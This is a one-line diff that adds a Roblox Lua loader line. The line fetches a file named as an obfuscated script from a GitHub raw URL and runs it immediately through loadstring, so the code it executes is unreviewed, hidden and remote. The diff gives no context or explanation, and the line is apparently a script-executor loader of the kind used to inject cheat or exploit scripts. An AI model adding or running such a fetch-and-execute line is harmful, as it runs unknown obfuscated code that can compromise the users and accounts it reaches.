@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/darkzinhoss/darkchat/refs/heads/main/obfuscated_script-1786665078898.lua.txt"))()
